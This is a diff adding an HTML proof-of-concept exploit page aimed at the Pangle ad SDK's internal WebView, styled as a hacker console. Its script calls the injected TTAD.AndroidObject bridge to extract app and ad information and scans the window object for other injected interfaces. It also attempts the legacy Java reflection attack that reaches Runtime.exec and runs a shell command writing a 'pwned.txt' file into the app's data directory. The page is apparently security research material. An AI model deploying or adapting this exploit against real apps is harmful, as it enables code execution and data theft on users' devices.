@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pangle SDK JavascriptInterface Exploit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: monospace; background-color: #1a1a1a; color: #00ff00; padding: 20px; }
+        button { background-color: #333; color: #00ff00; border: 1px solid #00ff00; padding: 10px; cursor: pointer; margin: 5px 0; display: block; width: 100%; text-align: left;}
+        #output { margin-top: 20px; white-space: pre-wrap; word-wrap: break-word; border-top: 1px solid #444; padding-top: 10px;}
+        .info { color: #888; font-size: 0.8em; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <h2>[+] WebView Hijacked</h2>
+    <div class="info">Context: Pangle SDK Internal WebView (TTWebsiteActivity)</div>
+    
+    <button onclick="exploitInterface()">1. Extract App & Ad Info</button>
+    <button onclick="probeAllInterfaces()">2. Probe All Potential Interfaces</button>
+    <button onclick="triggerLegacyRCE()">3. Attempt Legacy Reflection RCE</button>
+
+    <div id="output">[*] Waiting for interaction...</div>
+
+    <script>
+        const output = document.getElementById("output");
+
+        function log(msg, color = "#00ff00") {
+            const span = document.createElement("span");
+            span.style.color = color;
+            span.innerHTML = msg + "
+";
+            output.appendChild(span);
+            console.log(msg);
+        }
+
+        function exploitInterface() {
+            log("[*] Probing for 'TTAD.AndroidObject'...");
+            
+            if (window.TTAD && window.TTAD.AndroidObject) {
+                log("[+] Found TTAD.AndroidObject!", "#ffff00");
+
+                try {
+                    const methods = ["appInfo", "adInfo", "getTemplateInfo", "getCurrentVideoState"];
+                    methods.forEach(method => {
+                        if (typeof window.TTAD.AndroidObject[method] === 'function') {
+                            log(`[*] Calling ${method}()...`);
+                            const result = window.TTAD.AndroidObject[method]();
+                            log(`[+] ${method} result: ${result}`, "#ffffff");
+                        }
+                    });
+                } catch (e) {
+                    log("[-] Error calling interface methods: " + e.message, "#ff0000");
+                }
+            } else {
+                log("[-] TTAD.AndroidObject not found.", "#ff0000");
+            }
+        }
+
+        function probeAllInterfaces() {
+            log("[*] Scanning window object for potential JSInterfaces...");
+            const potentialInterfaces = [];
+            for (let prop in window) {
+                try {
+                    // Look for objects that might be injected (often have custom prototypes or specific methods)
+                    if (window[prop] && typeof window[prop] === 'object' && prop !== 'window' && prop !== 'top') {
+                        // SDK interfaces often don't have standard JS object properties
+                        potentialInterfaces.push(prop);
+                    }
+                } catch (e) {}
+            }
+            log("[+] Potential interfaces found: " + potentialInterfaces.join(", "), "#8888ff");
+        }
+
+        function triggerLegacyRCE() {
+            log("[*] Attempting reflection-based RCE (API < 17)...", "#ffaa00");
+            if (window.TTAD && window.TTAD.AndroidObject) {
+                try {
+                    // This will fail on modern Android due to @JavascriptInterface requirement
+                    const runtime = window.TTAD.AndroidObject.getClass().forName("java.lang.Runtime")
+                        .getMethod("getRuntime", null).invoke(null, null);
+                    runtime.exec(["/system/bin/sh", "-c", "id > /data/data/com.union_test.internationad/pwned.txt"]);
+                    log("[+] Payload sent to Runtime.exec()", "#ffff00");
+                } catch(e) {
+                    log("[-] Reflection blocked: " + e.message, "#ff0000");
+                }
+            }
+        }
+    </script>
+</body>
+</html>
